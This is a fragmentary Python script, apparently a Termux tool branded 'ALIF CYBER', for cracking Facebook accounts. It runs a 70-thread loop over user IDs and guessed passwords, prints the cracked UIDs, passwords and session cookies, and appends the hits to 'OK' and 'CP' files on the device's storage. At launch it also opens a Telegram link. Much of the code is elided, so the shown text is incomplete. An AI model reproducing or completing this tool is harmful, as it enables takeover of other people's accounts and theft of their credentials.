...
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/ALIF99ALIF')
import os
os.system("pkg install espeak")
#__________ALIF CYBER 99 ALIF
print("walcome to SEE MORE ALIF CYBER 99 ALIF")
logo = ("""
           _      _____ ______    _______     ______  ______ _____  
\033[38;5;46m     /\   | |    |_   _|  ____|  / ____\ \   / /  _ \|  ____|  __ \   \033[31;1m
\033[38;5;46m    /  \  | |      | | | |__    | |     \ \_/ /| |_) | |__  | |__) |  \033[31;1m
\033[38;5;46m   / /\ \ | |      | | |  __|   | |      \   / |  _ <|  __| |  _  /   \033[31;1m
\033[38;5;46m  / ____ \| |____ _| |_| |      | |____   | |  | |_) | |____| | \ \   \033[31;1m
\033[38;5;46m /_/    \_\______|_____|_|       \_____|  |_|  |____/|______|_|  \_\  \033[31;1m
...
def xxr():
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[38;5;46m𝗔𝗟𝗜𝗙 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 𝗔𝗟𝗜𝗙')
        print('\033[38;5;46m══════════════════════════════════')
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝗔𝗟𝗜𝗙\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎❴\033[38;5;46m𝙇𝙄𝙏𝙀+𝙇𝙊𝙂𝙄𝙉❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝗔𝗟𝗜𝗙\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     𝗔𝗟𝗜𝗙 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     𝗔𝗟𝗜𝗙 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/𝗔𝗟𝗜𝗙-𝗖𝗬𝗕𝗘𝗥-𝟬𝟰𝟵𝟵-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
...
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open('/sdcard/\033[38;5;46m𝗔𝗟𝗜𝗙-𝗖𝗬𝗕𝗘𝗥-𝟬𝟰𝟵𝟵-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
#______𝑬𝑴𝑶𝑱𝑰-𝑪𝑹𝑲-𝑺𝒀𝑺𝑻𝑬𝑴👇👇👇👇 
        brand=random.choice(['ALIF CYBER','ALIF-CYBER ','ALIF CRACK '])
        ...
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗕𝗢𝗦𝗦=𝗔𝗟𝗜𝗙💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()
